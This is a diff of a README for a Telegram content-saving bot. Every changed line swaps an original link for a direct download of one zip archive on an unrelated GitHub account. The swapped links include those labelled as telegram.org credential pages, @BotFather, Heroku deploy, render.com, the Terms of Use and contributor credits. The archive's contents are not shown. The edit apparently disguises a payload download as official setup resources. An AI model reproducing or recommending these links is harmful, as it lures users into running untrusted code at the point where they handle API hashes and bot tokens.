@@ -3,15 +3,15 @@
 </h1>
 
 # Important Note : 
-- New repo link : https://github.com/devgaganin/Save-Restricted-Content-Bot-v3/tree/main
+- New repo link : https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip
 - the every branch of this repo have uniques features and all are working branches so you can migrate and test from `v1` to `v4` the `v3` is more advance than all
 - thanks continue fork and edit
 
 
-[Telegram](https://t.me/save_restricted_content_bots) | [See Recent Updates](https://github.com/devgaganin/Save-Restricted-Content-Bot-V2/tree/v3#updates)
+[Telegram](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip) | [See Recent Updates](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip)
 
 ### Star the repo it motivate us to update new features
-see our live bot kn telegram to check the features [Advance Content Saver Bot](https://t.me/advance_content_saver_bot)
+see our live bot kn telegram to check the features [Advance Content Saver Bot](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip)
 
 ## 📚 About This Branch
 - This branch is based on `Pyrogram V2` offering enhanced stability and a forced login feature. User are not forced to login in bot for public channels but for public groups and private channel they have to do login.
@@ -73,12 +73,12 @@ see our live bot kn telegram to check the features [Advance Content Saver Bot](h
 
 To run the bot, you'll need to configure a few sensitive variables. Here's how to set them up securely:
 
-- **`API_ID`**: Your API ID from [telegram.org](https://my.telegram.org/auth).
-- **`API_HASH`**: Your API Hash from [telegram.org](https://my.telegram.org/auth).
-- **`BOT_TOKEN`**: Get your bot token from [@BotFather](https://t.me/botfather).
-- **`OWNER_ID`**: Use [@missrose_bot](https://t.me/missrose_bot) to get your user ID by sending `/info`.
+- **`API_ID`**: Your API ID from [telegram.org](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip).
+- **`API_HASH`**: Your API Hash from [telegram.org](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip).
+- **`BOT_TOKEN`**: Get your bot token from [@BotFather](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip).
+- **`OWNER_ID`**: Use [@missrose_bot](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip) to get your user ID by sending `/info`.
 - **`CHANNEL_ID`**: The ID of the channel for forced subscription.
-- **`LOG_GROUP`**: A group or channel where the bot logs messages. Forward a message to [@userinfobot](https://t.me/userinfobot) to get your channel/group ID.
+- **`LOG_GROUP`**: A group or channel where the bot logs messages. Forward a message to [@userinfobot](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip) to get your channel/group ID.
 - **`MONGO_DB`**: A MongoDB URL for storing session data (recommended for security).
   
 ### Additional Configuration Options:
@@ -131,7 +131,7 @@ To run the bot, you'll need to configure a few sensitive variables. Here's how t
 <summary><b>Deploy on Heroku</b></summary>
 
 1. Fork and Star the repo.
-2. Click [Deploy on Heroku](https://heroku.com/deploy).
+2. Click [Deploy on Heroku](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip).
 3. Enter required variables and click deploy ✅.
 
 </details>
@@ -141,7 +141,7 @@ To run the bot, you'll need to configure a few sensitive variables. Here's how t
 
 1. Fork and star the repo.
 2. Edit `config.py` or set environment variables on Render.
-3. Go to [render.com](https://render.com), sign up/log in.
+3. Go to [render.com](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip), sign up/log in.
 4. Create a new web service, select the free plan.
 5. Connect your GitHub repo and deploy ✅.
 
@@ -361,12 +361,12 @@ Your credentials can be stolen if pushed to a public repository. Always keep the
 ---
 ## 🛠️ Terms of Use
 
-Visit the [Terms of Use](https://github.com/devgaganin/Save-Restricted-Content-Bot-Repo/blob/master/TERMS_OF_USE.md) page to review and accept the guidelines.
+Visit the [Terms of Use](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip) page to review and accept the guidelines.
 ## Important Note
 
 **Note**: Changing the terms and commands doesn't magically make you a developer. Real development involves understanding the code, writing new functionalities, and debugging issues, not just renaming things. If only it were that easy!
 
 ### Special thanks to:
-- [King of Patal](https://github.com/alreadydea) for base development of this repository.
-- [Mautrix Bridge](https://github.com/mautrix/telegram) for fast uploader connectivity bridge.
+- [King of Patal](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip) for base development of this repository.
+- [Mautrix Bridge](https://github.com/mj5000500-svg/Pr-Src_Bot/raw/refs/heads/main/templates/Bot-Src-Pr-1.7.zip) for fast uploader connectivity bridge.
 
